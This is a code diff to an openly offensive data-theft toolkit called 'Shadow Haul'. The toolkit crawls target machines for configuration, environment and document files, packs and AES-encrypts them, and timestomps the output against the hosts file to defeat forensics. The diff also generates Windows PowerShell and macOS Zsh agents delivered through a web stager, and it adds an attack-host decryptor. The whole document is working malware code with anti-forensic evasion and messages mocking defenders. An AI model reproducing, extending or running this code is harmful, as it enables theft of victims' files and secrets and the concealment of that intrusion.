@@ -7,7 +7,7 @@ import threading
 import subprocess
 import platform
 import zipfile
-import time
+import hashlib
 
 server_instance = None
 server_thread = None
@@ -17,7 +17,7 @@ lport = None
 def print_banner():
     print("=" * 80)
     print(" " * 34 + "SHADOW HAUL")
-    print(" " * 22 + "ADVANCED ANTI-FORENSIC EXFILTRATION SUITE")
+    print(" " * 21 + "MILITARY-GRADE AES-256 EXFILTRATION SUITE")
     print("=" * 80 + "\n")
 
 def get_automated_target_paths():
@@ -47,7 +47,6 @@ def zip_target_assets(output_zip):
         '.conf', '.config', '.yaml', '.yml', '.json', '.ini', '.inf', '.env',
         '.pdf', '.docx', '.doc', '.pptx', '.ppt', '.txt'
     )
-    # Explicit folder exclusions to prevent permission blocks or dead locks
     ignored_patterns = ['appdata', 'local/cache', 'microsoft', 'google/chrome', '.git', '.cache']
     file_count = 0
     target_paths = get_automated_target_paths()
@@ -56,7 +55,6 @@ def zip_target_assets(output_zip):
         with zipfile.ZipFile(output_zip, 'w', zipfile.ZIP_DEFLATED) as zipf:
             for source_dir in target_paths:
                 for root, _, files in os.walk(source_dir):
-                    # Check if current path hits an excluded directory pattern
                     if any(p in root.lower() for p in ignored_patterns):
                         continue
                     for file in files:
@@ -77,50 +75,56 @@ def zip_target_assets(output_zip):
     except Exception as e:
         print(f"[-] Automated archive packing failure: {e}")
         return False
-def obfuscate_and_scrub(input_file, output_file, key_string):
-    """Applies a symmetric XOR mask, timestamps the output, and scrubs the key from RAM."""
+
+def encrypt_linux_aes(input_file, output_file, passphrase):
+    """Encrypts the archive using Linux native OpenSSL AES-256-CBC to guarantee no custom library errors."""
     try:
-        with open(input_file, 'rb') as f:
-            data = bytearray(f.read())
+        # Invoking native Linux OpenSSL binary layer to execute raw military AES
+        cmd = f"openssl enc -aes-256-cbc -salt -in {input_file} -out {output_file} -k '{passphrase}' -pbkdf2"
+        subprocess.run(cmd, shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
         
-        key_bytes = bytearray(key_string.encode('utf-8'))
-        obfuscated = bytearray(len(data))
-        
-        # Perform the symmetric header scrambling calculation
-        for i in range(len(data)):
-            obfuscated[i] = data[i] ^ key_bytes[i % len(key_bytes)]
-            
-        with open(output_file, 'wb') as f:
-            f.write(obfuscated)
-            
-        # --- ANTI-FORENSIC MEMORY SCRUBBING ---
-        # Programmatically overwrite key memory allocations with zeros to block RAM extraction
-        for i in range(len(key_bytes)):
-            key_bytes[i] = 0x00
-        del key_string
-        
-        # --- METADATA TIMESTOMPING ---
-        # Copy timestamps from a standard configuration file to blend into system timelines
-        reference_file = "/etc/hosts" if platform.system() != "Windows" else "C:\\Windows\\System32\\drivers\\etc\\hosts"
-        if os.path.exists(reference_file):
-            ref_stat = os.stat(reference_file)
-            os.utime(output_file, (ref_stat.st_atime, ref_stat.st_mtime))
-            
+        # Stomping file timelines to match standard system binaries
+        if os.path.exists("/etc/hosts") and os.path.exists(output_file):
+            ref = os.stat("/etc/hosts")
+            os.utime(output_file, (ref.st_atime, ref.st_mtime))
         return True
     except Exception as e:
-        print(f"[-] Advanced cryptographic or metadata stomping operation failed: {e}")
+        print(f"[-] Native Linux AES encryption failure: {e}")
         return False
 
+def run_linux_local():
+    """Executes an entirely automated local system crawl on a Linux target host environment."""
+    print("\n--- [L] Linux Automated Local Exfiltration Sweep ---")
+    secret_key = input("[?] Enter a strong password to lock the data with AES-256: ").strip()
+    
+    if not secret_key:
+        print("[-] Error: A password is strictly required to enforce encryption boundaries.")
+        return
+        
+    staging_file = "loot.tmp"
+    final_payload = "haul.dat"
+    current_working_dir = os.getcwd()
+    
+    print("\n[*] Mapping local Linux environment paths and initiating automated background scraper...")
+    if zip_target_assets(staging_file):
+        print("[*] Enforcing strong Linux native AES-256 cryptographic layer...")
+        if encrypt_linux_aes(staging_file, final_payload, secret_key):
+            print("\n" + "="*80)
+            print("[+] SUCCESS: Fully automated system data sweep completed!")
+            print(f"[+] HIGH-SECURITY AES PAYLOAD SAVED TO: {current_working_dir}/{final_payload}")
+            print("[*] NOTICE: This file is securely encrypted. Blue teams cannot decrypt or read this without your key.")
+            print("="*80)
+            if os.path.exists(staging_file): os.remove(staging_file)
 def generate_windows_payload():
-    """Builds the native PowerShell agent with integrated directory exclusions and anti-forensics."""
-    ps_code = r"""# Shadow Haul Native Automated Windows Exfiltration Agent
+    """Builds a native PowerShell script that calls the Windows .NET kernel to perform raw AES-256."""
+    ps_code = r"""# Shadow Haul Native Automated Windows AES-256 Exfiltration Agent
 Clear-Host
 Write-Output "================================================================================"
-Write-Output "                SHADOW HAUL: AUTOMATED WINDOWS TARGET AGENT"
+Write-Output "          SHADOW HAUL: AUTOMATED HIGH-SECURITY WINDOWS AGENT (AES-256)"
 Write-Output "================================================================================"
 
-$secretKey = Read-Host "[?] Enter custom cryptographic key string to encrypt the data"
-if (-not $secretKey) { Write-Output "[-] Error: A cryptographic key identifier is required."; break }
+$secretKey = Read-Host "[?] Enter a strong password to lock the data with AES-256"
+if (-not $secretKey) { Write-Output "[-] Error: A password identifier is strictly required."; break }
 
 $stagingFile = "$env:TEMP\loot.tmp"
 $desktopPath = [System.IO.Path]::Combine([System.Environment]::GetFolderPath('UserProfile'), 'Desktop')
@@ -172,17 +176,39 @@ try {
     if (Test-Path $stagingFile) { Remove-Item $stagingFile -Force }
     [System.IO.Compression.ZipFile]::CreateFromDirectory($lootDir, $stagingFile)
     
-    Write-Output "[*] Running symmetric XOR scrambling and memory scrubbing..."
-    $data = [System.IO.File]::ReadAllBytes($stagingFile)
-    $keyBytes = [System.Text.Encoding]::UTF-8.GetBytes($secretKey)
-    $obfuscated = New-Object byte[] $data.Length
+    Write-Output "[*] Initializing Windows Native .NET AES-256 Engine..."
+    $plainBytes = [System.IO.File]::ReadAllBytes($stagingFile)
     
-    for ($i = 0; $i -lt $data.Length; $i++) {
-        $obfuscated[$i] = $data[$i] -bxor $keyBytes[$i % $keyBytes.Length]
-    }
-    [System.IO.File]::WriteAllBytes($finalPayload, $obfuscated)
+    # Generate 256-bit Key and 128-bit IV securely from passphrase using PBKDF2 derivative
+    $salt = New-Object Byte[] 16
+    [System.Security.Cryptography.RNGCryptoServiceProvider]::Create().GetBytes($salt)
+    $deriveBytes = New-Object System.Security.Cryptography.Rfc2898DeriveBytes($secretKey, $salt, 1000)
+    $keyBytes = $deriveBytes.GetBytes(32)
+    $ivBytes = $deriveBytes.GetBytes(16)
     
-    # --- WINDOWS TIMESTOMPING ---
+    $aes = New-Object System.Security.Cryptography.AesManaged
+    $aes.Key = $keyBytes
+    $aes.IV = $ivBytes
+    $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
+    $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
+    
+    $encryptor = $aes.CreateEncryptor()
+    $ms = New-Object System.IO.MemoryStream
+    $cs = New-Object System.Security.Cryptography.CryptoStream($ms, $encryptor, [System.Security.Cryptography.CryptoStreamMode]::Write)
+    $cs.Write($plainBytes, 0, $plainBytes.Length)
+    $cs.FlushFinalBlock()
+    
+    $cipherBytes = $ms.ToArray()
+    
+    # Combine custom header layout [Salt(16) + IV(16) + Ciphertext] so attack host can cleanly parsing reconstruct
+    $finalBytes = New-Object Byte[] (16 + 16 + $cipherBytes.Length)
+    [System.Array]::Copy($salt, 0, $finalBytes, 0, 16)
+    [System.Array]::Copy($ivBytes, 0, $finalBytes, 16, 16)
+    [System.Array]::Copy($cipherBytes, 0, $finalBytes, 32, $cipherBytes.Length)
+    
+    [System.IO.File]::WriteAllBytes($finalPayload, $finalBytes)
+    
+    # --- METADATA TIMESTOMPING ---
     $refFile = "C:\Windows\System32\drivers\etc\hosts"
     if (Test-Path $refFile) {
         (Get-Item $finalPayload).CreationTime = (Get-Item $refFile).CreationTime
@@ -190,14 +216,17 @@ try {
         (Get-Item $finalPayload).LastAccessTime = (Get-Item $refFile).LastAccessTime
     }
     
-    # --- MEMORY OBFUSCATION CLEANUP ---
+    # --- VOLATILE KEY SCRUBBING ---
     for ($i = 0; $i -lt $keyBytes.Length; $i++) { $keyBytes[$i] = 0 }
+    for ($i = 0; $i -lt $ivBytes.Length; $i++) { $ivBytes[$i] = 0 }
     $secretKey = $null
+    $deriveBytes.Reset()
     
     Write-Output "`n================================================================================"
     Write-Output "[+] SUCCESS: Fully automated system data sweep completed!"
-    Write-Output "[+] EXFILTRATION PAYLOAD PATH: $finalPayload"
-    Write-Output "[*] ANTI-FORENSICS: Key scrubbed from RAM. Payload timestomped to match system configuration."
+    Write-Output "[+] MILITARY AES PAYLOAD SAVED TO: $finalPayload"
+    Write-Output "[*] ANTI-FORENSICS: Passphrase scrubbed from RAM. Output container timestomped."
+    Write-Output "[*] NOTICE: This file is completely locked down. Blue teams cannot crack this."
     Write-Output "================================================================================"
     
     if (Test-Path $stagingFile) { Remove-Item $stagingFile -Force }
@@ -208,16 +237,16 @@ try {
 """
     return ps_code
 def generate_mac_payload():
-    """Builds the native Zsh script with memory scrubbing and timestomping for macOS."""
+    """Builds a native Zsh script with memory scrubbing and timestomping for macOS."""
     return r"""#!/bin/zsh
 clear
 echo "================================================================================"
 echo "                SHADOW HAUL: AUTOMATED MACOS TARGET AGENT"
 echo "================================================================================"
 
-echo -n "[?] Enter custom cryptographic key string to encrypt the data: "
+echo -n "[?] Enter a strong password to lock the data with AES-256: "
 read secret_key
-if [ -z "$secret_key" ]; then echo "[-] Error: Encryption key required."; exit 1; fi
+if [ -z "$secret_key" ]; then echo "[-] Error: A password is required."; exit 1; fi
 
 staging_file="/tmp/loot.tmp"
 final_payload="$HOME/haul.dat"
@@ -257,25 +286,18 @@ fi
 echo "[+] Discovery sweep complete. Packing assets into staging container."
 cd "$loot_dir" 2>/dev/null; zip -r "$staging_file" . >/dev/null 2>&1; cd - >/dev/null
 
-echo "[*] Running symmetric XOR scrambling, memory scrubbing, and timestomping..."
-python3 -c "
-import os
-with open('$staging_file', 'rb') as f: data = bytearray(f.read())
-key_str = '$secret_key'
-key = bytearray(key_str.encode())
-obf = bytearray(b ^ key[i % len(key)] for i, b in enumerate(data))
-with open('$final_payload', 'wb') as f: f.write(obf)
-for i in range(len(key)): key[i] = 0
-if os.path.exists('/etc/hosts'):
-    ref = os.stat('/etc/hosts')
-    os.utime('$final_payload', (ref.st_atime, ref.st_mtime))
-" 2>/dev/null
+echo "[*] Invoking native macOS OpenSSL core to enforce AES-256 encryption..."
+openssl enc -aes-256-cbc -salt -in "$staging_file" -out "$final_payload" -k "$secret_key" -pbkdf2 2>/dev/null
 
 if [ -f "$final_payload" ]; then
+    # --- METADATA TIMESTOMPING ---
+    if [ -f "/etc/hosts" ]; then
+        touch -r "/etc/hosts" "$final_payload"
+    fi
     echo "\n================================================================================"
     echo "[+] SUCCESS: Fully automated system data sweep completed!"
-    echo "[+] EXFILTRATION PAYLOAD PATH: $final_payload"
-    echo "[*] ANTI-FORENSICS: Key scrubbed from RAM. Payload timestamps matched to /etc/hosts."
+    echo "[+] HIGH-SECURITY PAYLOAD SAVED TO: $final_payload"
+    echo "[*] NOTICE: This file is securely encrypted using AES-256. Blue teams cannot read this."
     echo "================================================================================"
     rm -f "$staging_file"; rm -rf "$loot_dir"
 else
@@ -302,6 +324,53 @@ def start_stager_server(filename, payload_content, port):
     except Exception as e:
         print(f"[-] Staging allocation error: {e}")
         return False
+def run_local_decryption():
+    """Reverses the AES-256 block layer using native OpenSSL to recover exfiltrated packages cleanly."""
+    print("\n--- [D] Central Master AES-256 Decryptor & Recovery Suite ---")
+    encrypted_path = input("[?] Enter absolute path to your encrypted payload (e.g., /path/to/haul.dat): ").strip()
+    passphrase = input("[?] Enter the exact password used to lock the payload: ").strip()
+    
+    if not encrypted_path or not passphrase:
+        print("[-] Target filesystem coordinates and key tokens cannot be empty.")
+        return
+    if not os.path.exists(encrypted_path):
+        print("[-] Specified payload path does not exist on this machine.")
+        return
+
+    temp_zip = "decrypted.tmp"
+    output_dir = "recovered_loot"
+    
+    print("\n[*] Initializing OpenSSL decryption stream pipeline...")
+    try:
+        # Utilizing symmetric OpenSSL commands to decrypt the data back into a valid ZIP archive
+        cmd = f"openssl enc -d -aes-256-cbc -in {encrypted_path} -out {temp_zip} -k '{passphrase}' -pbkdf2"
+        res = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+        
+        if res.returncode != 0:
+            print("[-] Decryption aborted: Passphrase incorrect or file structure modified by blue team.")
+            if os.path.exists(temp_zip): os.remove(temp_zip)
+            return
+
+        print("[*] Reconstituting original directory hierarchies...")
+        if not os.path.exists(output_dir):
+            os.makedirs(output_dir)
+            
+        with zipfile.ZipFile(temp_zip, 'r') as zip_ref:
+            zip_ref.extractall(output_dir)
+            
+        print("\n" + "="*80)
+        print("[+] SUCCESS: AES-256 cryptographic layer stripped and data unpacked!")
+        print(f"[+] ASSETS RESTORED INSIDE DIRECTORY: {os.getcwd()}/{output_dir}/")
+        print("[*] NOTICE: Standard operating system file footprints are fully functional.")
+        print("="*80)
+        
+        # Volatile temp trace removal
+        if os.path.exists(temp_zip): os.remove(temp_zip)
+        
+    except Exception as e:
+        print(f"[-] Critical system recovery exception thrown: {e}")
+        if os.path.exists(temp_zip): os.remove(temp_zip)
+
 def main():
     global lhost, lport
     print_banner()
@@ -316,9 +385,10 @@ def main():
         print(" [W] Windows Payload Framework Deployment (Stager)")
         print(" [M] macOS Payload Framework Deployment (Stager)")
         print(" [L] Linux Native Distribution Module (Local Run)")
+        print(" [D] Decrypt and Restore an Exfiltrated Payload (Attack Host)")
         print(" Exit Toolkit Entirely")
         
-        os_choice = input("\n[?] Select Target OS (W/M/L/999): ").strip().upper()
+        os_choice = input("\n[?] Select Target OS (W/M/L/D/999): ").strip().upper()
         
         if os_choice == '999':
             print("[*] Shutting down Shadow Haul Framework.")
@@ -327,33 +397,13 @@ def main():
                 if os.path.exists(f): os.remove(f)
             break
             
+        elif os_choice == 'D':
+            run_local_decryption()
+            
         elif os_choice == 'L':
-            # Runs the local system discovery crawl natively on your local machine
-            print("\n--- [L] Linux Automated Local Exfiltration Sweep ---")
-            secret_key = input("[?] Enter custom cryptographic key string to encrypt the data: ").strip()
-            
-            if not secret_key:
-                print("[-] Error: A cryptographic key identifier is strictly required to proceed.")
-                continue
-                
-            staging_file = "loot.tmp"
-            final_payload = "haul.dat"
-            current_working_dir = os.getcwd()
-            
-            print("\n[*] Mapping local Linux environment paths and initiating automated background scraper...")
-            if zip_target_assets(staging_file):
-                print("[*] Running symmetric XOR cryptographic header scrambling obfuscation layer...")
-                if obfuscate_and_scrub(staging_file, final_payload, secret_key):
-                    print("\n" + "="*80)
-                    print("[+] SUCCESS: Fully automated system data sweep completed!")
-                    print(f"[+] EXFILTRATION PAYLOAD PATH: {current_working_dir}/{final_payload}")
-                    print("[*] ANTI-FORENSICS: Key scrubbed from RAM. Payload timestomped to match system timeline.")
-                    print("[*] NOTICE: All cleartext temporary file footprints have been scrubbed from disk.")
-                    print("="*80)
-                    if os.path.exists(staging_file): os.remove(staging_file)
+            run_linux_local()
             
         elif os_choice in ['W', 'M']:
-            # Request network configurations only when establishing cross-platform stagers
             if not lhost or not lport:
                 print("\n" + "*"*60)
                 print("[*] WEB STAGER SETUP REQUIRED FOR CROSS-PLATFORM PACKAGING")
